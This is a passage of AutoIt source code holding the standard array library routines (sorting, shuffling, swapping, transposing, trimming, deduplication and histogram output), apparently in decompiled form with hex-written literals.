            For $j = $icol_start To $icol_end
                $vtmp = $AARRAY[$i][$j]
                $AARRAY[$i][$j] = $AARRAY[$irand][$j]
                $AARRAY[$irand][$j] = $vtmp
            Next
        Next
        Return 0x1
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
EndFunc    ; -> _ArrayShuffle

Func _ArraySort(ByRef $AARRAY, $idescending = 0x0, $ISTART = 0x0, $IEND = 0x0, $isubitem = 0x0, $ipivot = 0x0)
    If $idescending = Default Then $idescending = 0x0
    If $ISTART = Default Then $ISTART = 0x0
    If $IEND = Default Then $IEND = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If $ipivot = Default Then $ipivot = 0x0
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, 0x0)
    Local $iubound = UBound($AARRAY) + -1
    If $iubound = + -1 Then Return SetError(0x5, 0x0, 0x0)
    If $IEND = Default Then $IEND = 0x0
    If $IEND < 0x1 Or $IEND > $iubound Or $IEND = Default Then $IEND = $iubound
    If $ISTART < 0x0 Or $ISTART = Default Then $ISTART = 0x0
    If $ISTART > $IEND Then Return SetError(0x2, 0x0, 0x0)
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        If $ipivot Then
            __ArrayDualPivotSort($AARRAY, $ISTART, $IEND)
        Else
            __ArrayQuickSort1D($AARRAY, $ISTART, $IEND)
        EndIf
        If $idescending Then _ArrayReverse($AARRAY, $ISTART, $IEND)
    Case 0x2
        If $ipivot Then Return SetError(0x6, 0x0, 0x0)
        Local $isubmax = UBound($AARRAY, $UBOUND_COLUMNS) + -1
        If $isubitem > $isubmax Then Return SetError(0x3, 0x0, 0x0)
        If $idescending Then
            $idescending = + -1
        Else
            $idescending = 0x1
        EndIf
        __ArrayQuickSort2D($AARRAY, $idescending, $ISTART, $IEND, $isubitem, $isubmax)
    Case Else
        Return SetError(0x4, 0x0, 0x0)
    EndSwitch
    Return 0x1
EndFunc    ; -> _ArraySort

Func __ArrayQuickSort1D(ByRef $AARRAY, Const ByRef $ISTART, Const ByRef $IEND)
    If $IEND <= $ISTART Then Return
    Local $vtmp
    If ($IEND - $ISTART) < 0xf Then
        Local $vcur
        For $i = $ISTART + 0x1 To $IEND
            $vtmp = $AARRAY[$i]
            If IsNumber($vtmp) Then
                For $j = $i + -1 To $ISTART Step + -1
                    $vcur = $AARRAY[$j]
                    If ($vtmp >= $vcur And IsNumber($vcur)) Or (Not IsNumber($vcur) And StringCompare($vtmp, $vcur) >= 0x0) Then ExitLoop
                    $AARRAY[$j + 0x1] = $vcur
                Next
            Else
                For $j = $i + -1 To $ISTART Step + -1
                    If (StringCompare($vtmp, $AARRAY[$j]) >= 0x0) Then ExitLoop
                    $AARRAY[$j + 0x1] = $AARRAY[$j]
                Next
            EndIf
            $AARRAY[$j + 0x1] = $vtmp
        Next
        Return
    EndIf
    Local $l = $ISTART, $r = $IEND, $vpivot = $AARRAY[Int(($ISTART + $IEND) / 0x2)], $bnum = IsNumber($vpivot)
    Do
        If $bnum Then
            While ($AARRAY[$l] < $vpivot And IsNumber($AARRAY[$l])) Or (Not IsNumber($AARRAY[$l]) And StringCompare($AARRAY[$l], $vpivot) < 0x0)
                $l += 0x1
            WEnd
            While ($AARRAY[$r] > $vpivot And IsNumber($AARRAY[$r])) Or (Not IsNumber($AARRAY[$r]) And StringCompare($AARRAY[$r], $vpivot) > 0x0)
                $r -= 0x1
            WEnd
        Else
            While (StringCompare($AARRAY[$l], $vpivot) < 0x0)
                $l += 0x1
            WEnd
            While (StringCompare($AARRAY[$r], $vpivot) > 0x0)
                $r -= 0x1
            WEnd
        EndIf
        If $l <= $r Then
            $vtmp = $AARRAY[$l]
            $AARRAY[$l] = $AARRAY[$r]
            $AARRAY[$r] = $vtmp
            $l += 0x1
            $r -= 0x1
        EndIf
    Until $l > $r
    __ArrayQuickSort1D($AARRAY, $ISTART, $r)
    __ArrayQuickSort1D($AARRAY, $l, $IEND)
EndFunc    ; -> __ArrayQuickSort1D

Func __ArrayQuickSort2D(ByRef $AARRAY, Const ByRef $istep, Const ByRef $ISTART, Const ByRef $IEND, Const ByRef $isubitem, Const ByRef $isubmax)
    If $IEND <= $ISTART Then Return
    Local $vtmp, $l = $ISTART, $r = $IEND, $vpivot = $AARRAY[Int(($ISTART + $IEND) / 0x2)][$isubitem], $bnum = IsNumber($vpivot)
    Do
        If $bnum Then
            While ($istep * ($AARRAY[$l][$isubitem] - $vpivot) < 0x0 And IsNumber($AARRAY[$l][$isubitem])) Or (Not IsNumber($AARRAY[$l][$isubitem]) And $istep * StringCompare($AARRAY[$l][$isubitem], $vpivot) < 0x0)
                $l += 0x1
            WEnd
            While ($istep * ($AARRAY[$r][$isubitem] - $vpivot) > 0x0 And IsNumber($AARRAY[$r][$isubitem])) Or (Not IsNumber($AARRAY[$r][$isubitem]) And $istep * StringCompare($AARRAY[$r][$isubitem], $vpivot) > 0x0)
                $r -= 0x1
            WEnd
        Else
            While ($istep * StringCompare($AARRAY[$l][$isubitem], $vpivot) < 0x0)
                $l += 0x1
            WEnd
            While ($istep * StringCompare($AARRAY[$r][$isubitem], $vpivot) > 0x0)
                $r -= 0x1
            WEnd
        EndIf
        If $l <= $r Then
            For $i = 0x0 To $isubmax
                $vtmp = $AARRAY[$l][$i]
                $AARRAY[$l][$i] = $AARRAY[$r][$i]
                $AARRAY[$r][$i] = $vtmp
            Next
            $l += 0x1
            $r -= 0x1
        EndIf
    Until $l > $r
    __ArrayQuickSort2D($AARRAY, $istep, $ISTART, $r, $isubitem, $isubmax)
    __ArrayQuickSort2D($AARRAY, $istep, $l, $IEND, $isubitem, $isubmax)
EndFunc    ; -> __ArrayQuickSort2D

Func __ArrayDualPivotSort(ByRef $AARRAY, $ipivot_left, $ipivot_right, $bleftmost = True)
    If $ipivot_left > $ipivot_right Then Return
    Local $ilength = $ipivot_right - $ipivot_left + 0x1
    Local $i, $j, $k, $iai, $iak, $ia1, $ia2, $ilast
    If $ilength < 0x2d Then
        If $bleftmost Then
            $i = $ipivot_left
            While $i < $ipivot_right
                $j = $i
                $iai = $AARRAY[$i + 0x1]
                While $iai < $AARRAY[$j]
                    $AARRAY[$j + 0x1] = $AARRAY[$j]
                    $j -= 0x1
                    If $j + 0x1 = $ipivot_left Then ExitLoop
                WEnd
                $AARRAY[$j + 0x1] = $iai
                $i += 0x1
            WEnd
        Else
            While 0x1
                If $ipivot_left >= $ipivot_right Then Return 0x1
                $ipivot_left += 0x1
                If $AARRAY[$ipivot_left] < $AARRAY[$ipivot_left + -1] Then ExitLoop
            WEnd
            While 0x1
                $k = $ipivot_left
                $ipivot_left += 0x1
                If $ipivot_left > $ipivot_right Then ExitLoop
                $ia1 = $AARRAY[$k]
                $ia2 = $AARRAY[$ipivot_left]
                If $ia1 < $ia2 Then
                    $ia2 = $ia1
                    $ia1 = $AARRAY[$ipivot_left]
                EndIf
                $k -= 0x1
                While $ia1 < $AARRAY[$k]
                    $AARRAY[$k + 0x2] = $AARRAY[$k]
                    $k -= 0x1
                WEnd
                $AARRAY[$k + 0x2] = $ia1
                While $ia2 < $AARRAY[$k]
                    $AARRAY[$k + 0x1] = $AARRAY[$k]
                    $k -= 0x1
                WEnd
                $AARRAY[$k + 0x1] = $ia2
                $ipivot_left += 0x1
            WEnd
            $ilast = $AARRAY[$ipivot_right]
            $ipivot_right -= 0x1
            While $ilast < $AARRAY[$ipivot_right]
                $AARRAY[$ipivot_right + 0x1] = $AARRAY[$ipivot_right]
                $ipivot_right -= 0x1
            WEnd
            $AARRAY[$ipivot_right + 0x1] = $ilast
        EndIf
        Return 0x1
    EndIf
    Local $iseventh = BitShift($ilength, 0x3) + BitShift($ilength, 0x6) + 0x1
    Local $ie1, $ie2, $ie3, $ie4, $ie5, $t
    $ie3 = Ceiling(($ipivot_left + $ipivot_right) / 0x2)
    $ie2 = $ie3 - $iseventh
    $ie1 = $ie2 - $iseventh
    $ie4 = $ie3 + $iseventh
    $ie5 = $ie4 + $iseventh
    If $AARRAY[$ie2] < $AARRAY[$ie1] Then
        $t = $AARRAY[$ie2]
        $AARRAY[$ie2] = $AARRAY[$ie1]
        $AARRAY[$ie1] = $t
    EndIf
    If $AARRAY[$ie3] < $AARRAY[$ie2] Then
        $t = $AARRAY[$ie3]
        $AARRAY[$ie3] = $AARRAY[$ie2]
        $AARRAY[$ie2] = $t
        If $t < $AARRAY[$ie1] Then
            $AARRAY[$ie2] = $AARRAY[$ie1]
            $AARRAY[$ie1] = $t
        EndIf
    EndIf
    If $AARRAY[$ie4] < $AARRAY[$ie3] Then
        $t = $AARRAY[$ie4]
        $AARRAY[$ie4] = $AARRAY[$ie3]
        $AARRAY[$ie3] = $t
        If $t < $AARRAY[$ie2] Then
            $AARRAY[$ie3] = $AARRAY[$ie2]
            $AARRAY[$ie2] = $t
            If $t < $AARRAY[$ie1] Then
                $AARRAY[$ie2] = $AARRAY[$ie1]
                $AARRAY[$ie1] = $t
            EndIf
        EndIf
    EndIf
    If $AARRAY[$ie5] < $AARRAY[$ie4] Then
        $t = $AARRAY[$ie5]
        $AARRAY[$ie5] = $AARRAY[$ie4]
        $AARRAY[$ie4] = $t
        If $t < $AARRAY[$ie3] Then
            $AARRAY[$ie4] = $AARRAY[$ie3]
            $AARRAY[$ie3] = $t
            If $t < $AARRAY[$ie2] Then
                $AARRAY[$ie3] = $AARRAY[$ie2]
                $AARRAY[$ie2] = $t
                If $t < $AARRAY[$ie1] Then
                    $AARRAY[$ie2] = $AARRAY[$ie1]
                    $AARRAY[$ie1] = $t
                EndIf
            EndIf
        EndIf
    EndIf
    Local $iless = $ipivot_left
    Local $igreater = $ipivot_right
    If (($AARRAY[$ie1] <> $AARRAY[$ie2]) And ($AARRAY[$ie2] <> $AARRAY[$ie3]) And ($AARRAY[$ie3] <> $AARRAY[$ie4]) And ($AARRAY[$ie4] <> $AARRAY[$ie5])) Then
        Local $ipivot_1 = $AARRAY[$ie2]
        Local $ipivot_2 = $AARRAY[$ie4]
        $AARRAY[$ie2] = $AARRAY[$ipivot_left]
        $AARRAY[$ie4] = $AARRAY[$ipivot_right]
        Do
            $iless += 0x1
        Until $AARRAY[$iless] >= $ipivot_1
        Do
            $igreater -= 0x1
        Until $AARRAY[$igreater] <= $ipivot_2
        $k = $iless
        While $k <= $igreater
            $iak = $AARRAY[$k]
            If $iak < $ipivot_1 Then
                $AARRAY[$k] = $AARRAY[$iless]
                $AARRAY[$iless] = $iak
                $iless += 0x1
            ElseIf $iak > $ipivot_2 Then
                While $AARRAY[$igreater] > $ipivot_2
                    $igreater -= 0x1
                    If $igreater + 0x1 = $k Then ExitLoop 0x2
                WEnd
                If $AARRAY[$igreater] < $ipivot_1 Then
                    $AARRAY[$k] = $AARRAY[$iless]
                    $AARRAY[$iless] = $AARRAY[$igreater]
                    $iless += 0x1
                Else
                    $AARRAY[$k] = $AARRAY[$igreater]
                EndIf
                $AARRAY[$igreater] = $iak
                $igreater -= 0x1
            EndIf
            $k += 0x1
        WEnd
        $AARRAY[$ipivot_left] = $AARRAY[$iless + -1]
        $AARRAY[$iless + -1] = $ipivot_1
        $AARRAY[$ipivot_right] = $AARRAY[$igreater + 0x1]
        $AARRAY[$igreater + 0x1] = $ipivot_2
        __ArrayDualPivotSort($AARRAY, $ipivot_left, $iless + -2, True)
        __ArrayDualPivotSort($AARRAY, $igreater + 0x2, $ipivot_right, False)
        If ($iless < $ie1) And ($ie5 < $igreater) Then
            While $AARRAY[$iless] = $ipivot_1
                $iless += 0x1
            WEnd
            While $AARRAY[$igreater] = $ipivot_2
                $igreater -= 0x1
            WEnd
            $k = $iless
            While $k <= $igreater
                $iak = $AARRAY[$k]
                If $iak = $ipivot_1 Then
                    $AARRAY[$k] = $AARRAY[$iless]
                    $AARRAY[$iless] = $iak
                    $iless += 0x1
                ElseIf $iak = $ipivot_2 Then
                    While $AARRAY[$igreater] = $ipivot_2
                        $igreater -= 0x1
                        If $igreater + 0x1 = $k Then ExitLoop 0x2
                    WEnd
                    If $AARRAY[$igreater] = $ipivot_1 Then
                        $AARRAY[$k] = $AARRAY[$iless]
                        $AARRAY[$iless] = $ipivot_1
                        $iless += 0x1
                    Else
                        $AARRAY[$k] = $AARRAY[$igreater]
                    EndIf
                    $AARRAY[$igreater] = $iak
                    $igreater -= 0x1
                EndIf
                $k += 0x1
            WEnd
        EndIf
        __ArrayDualPivotSort($AARRAY, $iless, $igreater, False)
    Else
        Local $ipivot = $AARRAY[$ie3]
        $k = $iless
        While $k <= $igreater
            If $AARRAY[$k] = $ipivot Then
                $k += 0x1
                ContinueLoop
            EndIf
            $iak = $AARRAY[$k]
            If $iak < $ipivot Then
                $AARRAY[$k] = $AARRAY[$iless]
                $AARRAY[$iless] = $iak
                $iless += 0x1
            Else
                While $AARRAY[$igreater] > $ipivot
                    $igreater -= 0x1
                WEnd
                If $AARRAY[$igreater] < $ipivot Then
                    $AARRAY[$k] = $AARRAY[$iless]
                    $AARRAY[$iless] = $AARRAY[$igreater]
                    $iless += 0x1
                Else
                    $AARRAY[$k] = $ipivot
                EndIf
                $AARRAY[$igreater] = $iak
                $igreater -= 0x1
            EndIf
            $k += 0x1
        WEnd
        __ArrayDualPivotSort($AARRAY, $ipivot_left, $iless + -1, True)
        __ArrayDualPivotSort($AARRAY, $igreater + 0x1, $ipivot_right, False)
    EndIf
EndFunc    ; -> __ArrayDualPivotSort

Func _ArraySwap(ByRef $AARRAY, $iindex_1, $iindex_2, $bcol = False, $ISTART = + -1, $IEND = + -1)
    If $bcol = Default Then $bcol = False
    If $ISTART = Default Then $ISTART = + -1
    If $IEND = Default Then $IEND = + -1
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS) + -1
    Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS) + -1
    If $idim_2 = + -1 Then
        $bcol = False
        $ISTART = + -1
        $IEND = + -1
    EndIf
    If $ISTART > $IEND Then Return SetError(0x5, 0x0, + -1)
    If $bcol Then
        If $iindex_1 < 0x0 Or $iindex_2 > $idim_2 Then Return SetError(0x3, 0x0, + -1)
        If $ISTART = + -1 Then $ISTART = 0x0
        If $IEND = + -1 Then $IEND = $idim_1
    Else
        If $iindex_1 < 0x0 Or $iindex_2 > $idim_1 Then Return SetError(0x3, 0x0, + -1)
        If $ISTART = + -1 Then $ISTART = 0x0
        If $IEND = + -1 Then $IEND = $idim_2
    EndIf
    Local $vtmp
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        $vtmp = $AARRAY[$iindex_1]
        $AARRAY[$iindex_1] = $AARRAY[$iindex_2]
        $AARRAY[$iindex_2] = $vtmp
    Case 0x2
        If $ISTART < + -1 Or $IEND < + -1 Then Return SetError(0x4, 0x0, + -1)
        If $bcol Then
            If $ISTART > $idim_1 Or $IEND > $idim_1 Then Return SetError(0x4, 0x0, + -1)
            For $j = $ISTART To $IEND
                $vtmp = $AARRAY[$j][$iindex_1]
                $AARRAY[$j][$iindex_1] = $AARRAY[$j][$iindex_2]
                $AARRAY[$j][$iindex_2] = $vtmp
            Next
        Else
            If $ISTART > $idim_2 Or $IEND > $idim_2 Then Return SetError(0x4, 0x0, + -1)
            For $j = $ISTART To $IEND
                $vtmp = $AARRAY[$iindex_1][$j]
                $AARRAY[$iindex_1][$j] = $AARRAY[$iindex_2][$j]
                $AARRAY[$iindex_2][$j] = $vtmp
            Next
        EndIf
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
    Return 0x1
EndFunc    ; -> _ArraySwap

Func _ArrayToClip(Const ByRef $AARRAY, $sdelim_col = "|", $ISTART_ROW = + -1, $IEND_ROW = + -1, $sdelim_row = @CRLF, $ISTART_COL = + -1, $IEND_COL = + -1)
    Local $sresult = _ArrayToString($AARRAY, $sdelim_col, $ISTART_ROW, $IEND_ROW, $sdelim_row, $ISTART_COL, $IEND_COL)
    If @error Then Return SetError(@error, 0x0, 0x0)
    If ClipPut($sresult) Then Return 0x1
    Return SetError(+ -1, 0x0, 0x0)
EndFunc    ; -> _ArrayToClip

Func _ArrayToString(Const ByRef $AARRAY, $sdelim_col = "|", $ISTART_ROW = Default, $IEND_ROW = Default, $sdelim_row = @CRLF, $ISTART_COL = Default, $IEND_COL = Default)
    If $sdelim_col = Default Then $sdelim_col = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $ISTART_ROW = Default Then $ISTART_ROW = + -1
    If $IEND_ROW = Default Then $IEND_ROW = + -1
    If $ISTART_COL = Default Then $ISTART_COL = + -1
    If $IEND_COL = Default Then $IEND_COL = + -1
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, + -1)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS) + -1
    If $idim_1 = + -1 Then Return ''
    If $ISTART_ROW = + -1 Then $ISTART_ROW = 0x0
    If $IEND_ROW = + -1 Then $IEND_ROW = $idim_1
    If $ISTART_ROW < + -1 Or $IEND_ROW < + -1 Then Return SetError(0x3, 0x0, + -1)
    If $ISTART_ROW > $idim_1 Or $IEND_ROW > $idim_1 Then Return SetError(0x3, 0x0, '')
    If $ISTART_ROW > $IEND_ROW Then Return SetError(0x4, 0x0, + -1)
    Local $sret = ''
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        For $i = $ISTART_ROW To $IEND_ROW
            $sret &= $AARRAY[$i] & $sdelim_col
        Next
        Return StringTrimRight($sret, StringLen($sdelim_col))
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS) + -1
        If $idim_2 = + -1 Then Return ''
        If $ISTART_COL = + -1 Then $ISTART_COL = 0x0
        If $IEND_COL = + -1 Then $IEND_COL = $idim_2
        If $ISTART_COL < + -1 Or $IEND_COL < + -1 Then Return SetError(0x5, 0x0, + -1)
        If $ISTART_COL > $idim_2 Or $IEND_COL > $idim_2 Then Return SetError(0x5, 0x0, + -1)
        If $ISTART_COL > $IEND_COL Then Return SetError(0x6, 0x0, + -1)
        Local $idelimcollen = StringLen($sdelim_col)
        For $i = $ISTART_ROW To $IEND_ROW
            For $j = $ISTART_COL To $IEND_COL
                $sret &= $AARRAY[$i][$j] & $sdelim_col
            Next
            $sret = StringTrimRight($sret, $idelimcollen) & $sdelim_row
        Next
        Return StringTrimRight($sret, StringLen($sdelim_row))
    Case Else
        Return SetError(0x2, 0x0, + -1)
    EndSwitch
    Return 0x1
EndFunc    ; -> _ArrayToString

Func _ArrayTranspose(ByRef $AARRAY, $bforce1d = False)
    Local $atemp
    Switch $bforce1d
    Case Default
        $bforce1d = False
    Case True, False
    Case Else
        Return SetError(0x3, 0x0, 0x0)
    EndSwitch
    Switch UBound($AARRAY, 0x0)
    Case 0x0
        Return SetError(0x2, 0x0, 0x0)
    Case 0x1
        Local $atemp[0x1][UBound($AARRAY)]
        For $i = 0x0 To UBound($AARRAY) + -1
            $atemp[0x0][$i] = $AARRAY[$i]
        Next
        $AARRAY = $atemp
    Case 0x2
        Local $idim_1 = UBound($AARRAY, 0x1), $idim_2 = UBound($AARRAY, 0x2)
        If $idim_1 <> $idim_2 Then
            Local $atemp[$idim_2][$idim_1]
            For $i = 0x0 To $idim_1 + -1
                For $j = 0x0 To $idim_2 + -1
                    $atemp[$j][$i] = $AARRAY[$i][$j]
                Next
            Next
            $AARRAY = $atemp
        Else
            Local $velement
            For $i = 0x0 To $idim_1 + -1
                For $j = $i + 0x1 To $idim_2 + -1
                    $velement = $AARRAY[$i][$j]
                    $AARRAY[$i][$j] = $AARRAY[$j][$i]
                    $AARRAY[$j][$i] = $velement
                Next
            Next
        EndIf
        If $bforce1d = True And UBound($AARRAY, 0x2) = 0x1 Then
            $atemp = $AARRAY
            ReDim $AARRAY[UBound($atemp)]
            For $i = 0x0 To UBound($atemp) + -1
                $AARRAY[$i] = $atemp[$i][0x0]
            Next
        EndIf
    Case Else
        Return SetError(0x1, 0x0, 0x0)
    EndSwitch
    Return 0x1
EndFunc    ; -> _ArrayTranspose

Func _ArrayTrim(ByRef $AARRAY, $itrimnum, $idirection = 0x0, $ISTART = 0x0, $IEND = 0x0, $isubitem = 0x0)
    If $idirection = Default Then $idirection = 0x0
    If $ISTART = Default Then $ISTART = 0x0
    If $IEND = Default Then $IEND = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If Not IsArray($AARRAY) Then Return SetError(0x1, 0x0, 0x0)
    Local $idim_1 = UBound($AARRAY, $UBOUND_ROWS) + -1
    If $IEND = 0x0 Then $IEND = $idim_1
    If $ISTART > $IEND Then Return SetError(0x3, 0x0, + -1)
    If $ISTART < 0x0 Or $IEND < 0x0 Then Return SetError(0x3, 0x0, + -1)
    If $ISTART > $idim_1 Or $IEND > $idim_1 Then Return SetError(0x3, 0x0, + -1)
    If $ISTART > $IEND Then Return SetError(0x4, 0x0, + -1)
    Switch UBound($AARRAY, $UBOUND_DIMENSIONS)
    Case 0x1
        If $idirection Then
            For $i = $ISTART To $IEND
                $AARRAY[$i] = StringTrimRight($AARRAY[$i], $itrimnum)
            Next
        Else
            For $i = $ISTART To $IEND
                $AARRAY[$i] = StringTrimLeft($AARRAY[$i], $itrimnum)
            Next
        EndIf
    Case 0x2
        Local $idim_2 = UBound($AARRAY, $UBOUND_COLUMNS) + -1
        If $isubitem < 0x0 Or $isubitem > $idim_2 Then Return SetError(0x5, 0x0, + -1)
        If $idirection Then
            For $i = $ISTART To $IEND
                $AARRAY[$i][$isubitem] = StringTrimRight($AARRAY[$i][$isubitem], $itrimnum)
            Next
        Else
            For $i = $ISTART To $IEND
                $AARRAY[$i][$isubitem] = StringTrimLeft($AARRAY[$i][$isubitem], $itrimnum)
            Next
        EndIf
    Case Else
        Return SetError(0x2, 0x0, 0x0)
    EndSwitch
    Return 0x1
EndFunc    ; -> _ArrayTrim

Func _ArrayUnique(Const ByRef $AARRAY, $icolumn = 0x0, $IBASE = 0x0, $ICASE = 0x0, $icount = $ARRAYUNIQUE_COUNT, $IINTTYPE = $ARRAYUNIQUE_AUTO)
    If $icolumn = Default Then $icolumn = 0x0
    If $IBASE = Default Then $IBASE = 0x0
    If $ICASE = Default Then $ICASE = 0x0
    If $icount = Default Then $icount = $ARRAYUNIQUE_COUNT
    If $IINTTYPE = Default Then $IINTTYPE = $ARRAYUNIQUE_AUTO
    If UBound($AARRAY, $UBOUND_ROWS) = 0x0 Then Return SetError(0x1, 0x0, 0x0)
    Local $idims = UBound($AARRAY, $UBOUND_DIMENSIONS), $inumcolumns = UBound($AARRAY, $UBOUND_COLUMNS)
    If $idims > 0x2 Then Return SetError(0x2, 0x0, 0x0)
    If $IBASE < 0x0 Or $IBASE > 0x1 Or (Not IsInt($IBASE)) Then Return SetError(0x3, 0x0, 0x0)
    If $ICASE < 0x0 Or $ICASE > 0x1 Or (Not IsInt($ICASE)) Then Return SetError(0x3, 0x0, 0x0)
    If $icount < 0x0 Or $icount > 0x1 Or (Not IsInt($icount)) Then Return SetError(0x4, 0x0, 0x0)
    If $IINTTYPE < 0x0 Or $IINTTYPE > 0x4 Or (Not IsInt($IINTTYPE)) Then Return SetError(0x5, 0x0, 0x0)
    If $icolumn < 0x0 Or ($inumcolumns = 0x0 And $icolumn > 0x0) Or ($inumcolumns > 0x0 And $icolumn >= $inumcolumns) Then Return SetError(0x6, 0x0, 0x0)
    If $IINTTYPE = $ARRAYUNIQUE_AUTO Then
        Local $bint, $svartype
        If $idims = 0x1 Then
            $bint = IsInt($AARRAY[$IBASE])
            $svartype = VarGetType($AARRAY[$IBASE])
        Else
            $bint = IsInt($AARRAY[$IBASE][$icolumn])
            $svartype = VarGetType($AARRAY[$IBASE][$icolumn])
        EndIf
        If $bint And $svartype = "Int64" Then
            $IINTTYPE = $ARRAYUNIQUE_FORCE64
        Else
            $IINTTYPE = $ARRAYUNIQUE_FORCE32
        EndIf
    EndIf
    ObjEvent("AutoIt.Error", __ArrayUnique_AutoErrFunc)
    Local $odictionary = ObjCreate("Scripting.Dictionary")
    $odictionary.CompareMode = Number(Not $ICASE)
    Local $velem, $stype, $vkey, $bcomerror = False
    For $i = $IBASE To UBound($AARRAY) + -1
        If $idims = 0x1 Then
            $velem = $AARRAY[$i]
        Else
            $velem = $AARRAY[$i][$icolumn]
        EndIf
        Switch $IINTTYPE
        Case $ARRAYUNIQUE_FORCE32
            $odictionary.Item($velem)
            If @error Then
                $bcomerror = True
                ExitLoop
            EndIf
        Case $ARRAYUNIQUE_FORCE64
            $stype = VarGetType($velem)
            If $stype = "Int32" Then
                $bcomerror = True
                ExitLoop
            EndIf
            $vkey = "#" & $stype & "#" & String($velem)
            If Not $odictionary.Item($vkey) Then
                $odictionary($vkey) = $velem
            EndIf
        Case $ARRAYUNIQUE_MATCH
            $stype = VarGetType($velem)
            If StringLeft($stype, 0x3) = "Int" Then
                $vkey = "#Int#" & String($velem)
            Else
                $vkey = "#" & $stype & "#" & String($velem)
            EndIf
            If Not $odictionary.Item($vkey) Then
                $odictionary($vkey) = $velem
            EndIf
        Case $ARRAYUNIQUE_DISTINCT
            $vkey = "#" & VarGetType($velem) & "#" & String($velem)
            If Not $odictionary.Item($vkey) Then
                $odictionary($vkey) = $velem
            EndIf
        EndSwitch
    Next
    Local $avalues, $j = 0x0
    If $bcomerror Then
        Return SetError(0x7, 0x0, 0x0)
    ElseIf $IINTTYPE <> $ARRAYUNIQUE_FORCE32 Then
        Local $avalues[$odictionary.Count]
        For $vkey In $odictionary.Keys()
            $avalues[$j] = $odictionary($vkey)
            If StringLeft($vkey, 0x5) = "#Ptr#" Then
                $avalues[$j] = Ptr($avalues[$j])
            EndIf
            $j += 0x1
        Next
    Else
        $avalues = $odictionary.Keys()
    EndIf
    If $icount Then
        _ArrayInsert($avalues, 0x0, $odictionary.Count)
    EndIf
    Return $avalues
EndFunc    ; -> _ArrayUnique

Func _Array1DToHistogram($AARRAY, $isizing = 0x64)
    If UBound($AARRAY, 0x0) > 0x1 Then Return SetError(0x1, 0x0, '')
    $isizing = $isizing * 0x8
    Local $t, $n, $imin = 0x0, $imax = 0x0, $ioffset = 0x0
    For $i = 0x0 To UBound($AARRAY) + -1
        $t = $AARRAY[$i]
        $t = IsNumber($t) ? Round($t) : 0x0
        If $t < $imin Then $imin = $t
        If $t > $imax Then $imax = $t
    Next
    Local $irange = Int(Round(($imax - $imin) / 0x8)) * 0x8
    Local $ispaceratio = 0x4
    For $i = 0x0 To UBound($AARRAY) + -1
        $t = $AARRAY[$i]
        If $t Then
            $n = Abs(Round(($isizing * $t) / $irange) / 0x8)
            $AARRAY[$i] = ''
            If $t > 0x0 Then
                If $imin Then
                    $ioffset = Int(Abs(Round(($isizing * $imin) / $irange) / 0x8) / 0x8 * $ispaceratio)
                    $AARRAY[$i] = __Array_StringRepeat(ChrW(0x20), $ioffset)
                EndIf
            Else
                If $imin <> $t Then
                    $ioffset = Int(Abs(Round(($isizing * ($t - $imin)) / $irange) / 0x8) / 0x8 * $ispaceratio)
                    $AARRAY[$i] = __Array_StringRepeat(ChrW(0x20), $ioffset)
                EndIf
            EndIf
            $AARRAY[$i]&= __Array_StringRepeat(ChrW(0x2588), Int($n / 0x8))
            $n = Mod($n, 0x8)
            If $n > 0x0 Then $AARRAY[$i]&= ChrW(0x2588 + 0x8 - $n)
            $AARRAY[$i]&= " " & $t
        Else
            $AARRAY[$i] = ''
        EndIf
    Next
    Return $AARRAY
EndFunc    ; -> _Array1DToHistogram

Func _array2dcreate($acol0, $acol1)
    If (UBound($acol0, 0x0) <> 0x1) Or (UBound($acol1, 0x0) <> 0x1) Then Return SetError(0x1, 0x0, '')
    Local $nrows = UBound($acol0)
    If $nrows <> UBound($acol1) Then Return SetError(0x2, 0x0, '')
    Local $atmp[$nrows][0x2]
    For $i = 0x0 To $nrows + -1
        $atmp[$i][0x0] = $acol0[$i]
        $atmp[$i][0x1] = $acol1[$i]
    Next
    Return $atmp
EndFunc    ; -> _array2dcreate

Func __Array_StringRepeat($sstring, $irepeatcount)
    $irepeatcount = Int($irepeatcount)
    If StringLen($sstring) < 0x1 Or $irepeatcount <= 0x0 Then Return SetError(0x1, 0x0, '')
    Local $sresult = ''
    While $irepeatcount > 0x1
        If BitAND($irepeatcount, 0x1) Then $sresult &= $sstring
        $sstring &= $sstring
        $irepeatcount = BitShift($irepeatcount, 0x1)
    WEnd
    Return $sstring & $sresult
EndFunc    ; -> __Array_StringRepeat

Func __Array_ExeterInternal(ByRef $AARRAY, $ISTART, $isize, $sdelimiter, ByRef $aidx, ByRef $aresult, ByRef $icount)
    If $ISTART == $isize + -1 Then
        For $i = 0x0 To $isize + -1
            $aresult[$icount]&= $AARRAY[$aidx[$i]] & $sdelimiter
        Next
        If $sdelimiter <> '' Then $aresult[$icount] = StringTrimRight($aresult[$icount], StringLen($sdelimiter))
        $icount += 0x1
    Else
        Local $itemp
        For $i = $ISTART To $isize + -1
            $itemp = $aidx[$i]
            $aidx[$i] = $aidx[$ISTART]
            $aidx[$ISTART] = $itemp
            __Array_ExeterInternal($AARRAY, $ISTART + 0x1, $isize, $sdelimiter, $aidx, $aresult, $icount)
            $aidx[$ISTART] = $aidx[$i]
            $aidx[$i] = $itemp
        Next
    EndIf
EndFunc    ; -> __Array_ExeterInternal

Func __Array_Combinations($in, $ir)
    Local $i_total = 0x1
    For $i = $ir To 0x1 Step + -1
        $i_total *= ($in / $i)
        $in -= 0x1
    Next
    Return Round($i_total)
EndFunc    ; -> __Array_Combinations

Func __Array_GetNext($in, $ir, ByRef $ileft, $itotal, ByRef $aidx)
    If $ileft == $itotal Then
        $ileft -= 0x1
        Return
    EndIf
    Local $i = $ir + -1
    While $aidx[$i] == $in - $ir + $i
